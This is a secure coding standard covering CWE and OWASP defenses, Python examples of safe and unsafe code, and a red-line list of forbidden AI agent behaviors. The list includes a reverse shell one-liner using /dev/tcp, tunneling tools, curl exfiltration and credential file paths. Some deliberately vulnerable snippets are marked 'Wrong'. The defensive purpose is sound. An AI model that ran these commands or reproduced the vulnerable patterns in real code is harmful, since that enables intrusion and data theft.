# Secure Coding Standards

This standard covers OWASP Top 10 defenses + high-risk CWE + AI Agent security behavior constraints. Tailor applicable sections by project tech stack.

---

## Part A: High-Risk CWE Defense Checklist

The following are the most dangerous vulnerability types from MITRE CWE Top 25 that must be actively defended against during development:

| CWE | Name | Impact | Defense Key Points |
|-----|------|--------|-------------------|
| CWE-79 | XSS | Steal user credentials, session hijacking | Output encoding + CSP + DOMPurify |
| CWE-89 | SQL Injection | Data breach, privilege escalation, RCE | Parameterized queries, never concatenate SQL |
| CWE-78 | OS Command Injection | Remote code execution | Disable shell=True, use argument lists |
| CWE-22 | Path Traversal | Arbitrary file read/write | Normalize paths + whitelist directories |
| CWE-434 | Unrestricted File Upload | Webshell, RCE | Validate MIME + rename + isolated storage |
| CWE-502 | Insecure Deserialization | RCE | Disable pickle.loads / unsafe yaml.load |
| CWE-918 | SSRF | Access internal resources, cloud metadata | URL whitelist + block 169.254/10.x/172.16 |
| CWE-862 | Missing Authorization | Unauthorized access | Check permissions on every endpoint |
| CWE-863 | Incorrect Authorization | Horizontal/vertical privilege escalation | RBAC + resource ownership verification |
| CWE-287 | Authentication Bypass | Unauthorized access | Unified authentication middleware |
| CWE-798 | Hardcoded Credentials | Credential leakage | Environment variables / Secret Manager |
| CWE-306 | Missing Auth for Critical Function | Sensitive operations abused | Write operations must require authentication |
| CWE-352 | CSRF | Forged user actions | CSRF Token + SameSite Cookie |
| CWE-611 | XXE | File read, SSRF | Disable external entity parsing |
| CWE-770 | Resource Exhaustion | DoS | Rate limit + request body limit + timeout |

---

## Part B: Coding Security Standards (OWASP Top 10 Defense)

### 1. Input Validation

- All external input (API parameters, file uploads, webhook payloads, URL parameters) must be validated
- Use whitelist validation, not blacklist
- Validate data type, length, range, format
- File uploads: validate MIME type, limit size, randomize filenames, don't store in web-accessible directories

```python
# Correct — Pydantic model validation
class CreateUserRequest(BaseModel):
    name: str = Field(max_length=100, pattern=r'^[a-zA-Z\s]+$')
    email: EmailStr
    age: int = Field(ge=0, le=150)

# Wrong — Using unvalidated input directly
name = request.json.get('name')
db.execute(f"INSERT INTO users (name) VALUES ('{name}')")
```

### 2. SQL Injection Defense (CWE-89)

- Use ORM or parameterized queries, **absolutely forbidden** to concatenate SQL with f-string / format / %
- Dynamic queries use query builders (SQLAlchemy / Prisma / GORM)
- Stored procedures must also use parameterization

```python
# Correct
db.execute("SELECT * FROM users WHERE id = :id", {"id": user_id})

# Wrong
db.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

### 3. Command Injection Defense (CWE-78)

```python
# Correct — Argument list, no shell
subprocess.run(["git", "clone", repo_url], check=True)

# Wrong — shell=True + user input
subprocess.run(f"git clone {repo_url}", shell=True)
```

### 4. XSS Defense (CWE-79)

- React/Vue escape by default; don't use `dangerouslySetInnerHTML` / `v-html` unless sanitized
- Server-side rendering: HTML entity encode output
- CSP (Content-Security-Policy) header must be configured
- User content rendering must use sanitization libraries like DOMPurify

### 5. Authentication & Authorization (CWE-287/862/863)

- All write operations must check authentication status
- Use RBAC or ABAC for access control
- Resource access verifies ownership (`WHERE user_id = current_user`), prevent IDOR
- Sensitive operations (delete, funds, permission changes) require audit logs
- Session/Token expiration times set reasonably
- Password storage uses bcrypt/argon2, never MD5/SHA1

### 6. Secret Management (CWE-798)

- **Absolutely forbidden** to hardcode secrets, tokens, passwords in code
- Use environment variables or Secret Manager (Vault / AWS Secrets Manager)
- `.env` files never committed to Git (ensure `.gitignore` includes them)
- API Keys follow least privilege principle
- Rotate secrets regularly

### 7. SSRF Defense (CWE-918)

```python
# Correct — URL whitelist + block internal addresses
ALLOWED_HOSTS = ["api.github.com", "registry.npmjs.org"]
parsed = urlparse(user_url)
if parsed.hostname not in ALLOWED_HOSTS:
    raise ValueError("Forbidden host")
# Additional check: resolve IP and verify not 10.x / 172.16-31.x / 192.168.x / 169.254.x
```

### 8. Deserialization Defense (CWE-502)

```python
# Forbidden
data = pickle.loads(user_input)
data = yaml.load(user_input)  # without Loader parameter

# Correct
data = json.loads(user_input)  # JSON is inherently safe
data = yaml.safe_load(user_input)
```

### 9. Dependency Security

- Run SCA scans regularly (Grype / Snyk / npm audit)
- Don't use dependency versions with known severe vulnerabilities
- Lock dependency versions (lock files must be committed)
- Review new dependencies' security history and maintenance status

### 10. Container Security

- Don't run applications as root user
- Use minimal base images (alpine / distroless)
- Don't mount Docker socket or sensitive host paths
- Set resource limits (CPU / Memory)
- Scan image vulnerabilities (Trivy / Grype)

### 11. API Security

- Rate limiting to prevent brute force and DoS
- Request body size limits
- CORS whitelist configuration, don't use `*`
- Sensitive endpoints don't pass parameters in URL (use POST body)
- Webhook signature verification

### 12. Logging Security

- Don't log sensitive information (passwords, tokens, PII, credit card numbers)
- Log injection defense: encode user input before writing to logs
- Audit logs include: who / what / when / where / result

### 13. Error Handling

- Production environments don't expose stack traces or internal error details
- Use unified error response format
- Distinguish client errors (4xx) from server errors (5xx)
- Critical operation errors must have alerting

---

## Part C: AI Agent Security Behavior Constraints (Red Line Rules)

The following behaviors are **absolutely forbidden** for Agents to execute or generate during development. Violation of any rule is treated as a severe security incident.

### Prohibited Network Behaviors

| Behavior | Description | Example |
|----------|-------------|---------|
| Reverse Shell | Connect a shell session to an external host via network | `bash -i >& /dev/tcp/x.x.x.x/port 0>&1` |
| C2 Callback | Connect to command-and-control server for instructions | HTTP beacon / DNS tunnel / WebSocket to unknown domains |
| Internal Network Tunneling | Expose internal services to the public internet | frp / ngrok / cloudflared tunnel / chisel |
| Port Forwarding to External | Forward local ports to externally controlled addresses | `ssh -R` / socat to external IP |
| Data Exfiltration | Send code/secrets/sensitive data to external destinations | curl POST to non-whitelisted domains, DNS exfiltration |

### Prohibited System Behaviors

| Behavior | Description |
|----------|-------------|
| Privilege Escalation | sudo escalation, modifying /etc/passwd, setuid binaries |
| Disabling Security Mechanisms | Disabling SELinux / AppArmor / firewall / audit logs |
| Installing Backdoors | crontab scheduled callbacks, .bashrc injection, SSH authorized_keys addition |
| Creating Hidden Users | Adding system users for persistent access |
| Modifying System Config | Modifying DNS resolution, hosts file, iptables rules (unless explicit ops requirement) |
| Covering Tracks | Deleting / modifying log files, history cleanup |

### Prohibited Code Patterns

| Pattern | Description |
|---------|-------------|
| Obfuscated Code | Base64-encoded execution, eval dynamic execution, exec concatenation |
| Network Scanning | Port scanning, subnet scanning (unless explicitly authorized pentest) |
| Credential Theft | Reading ~/.ssh/ / ~/.aws/ / /etc/shadow and other credential files |
| Ransomware | Encrypting user files and demanding decryption |
| Supply Chain Poisoning | Modifying package.json / setup.py install hooks to inject malicious code |

### Boundaries of Legitimate Security Operations

The following operations are permitted in **explicitly authorized** security testing scenarios, but must meet conditions:

1. **Penetration Testing**: Must have explicit scope and written authorization
2. **CTF Competitions**: Only operate on competition environments
3. **Security Research**: Only in isolated environments (VM / Docker)
4. **Defensive Verification**: Verify whether own system's security defenses are effective

**Judgment principle**: If the target is "own system defense" it's permitted; if the target is "external system attack" it's forbidden.
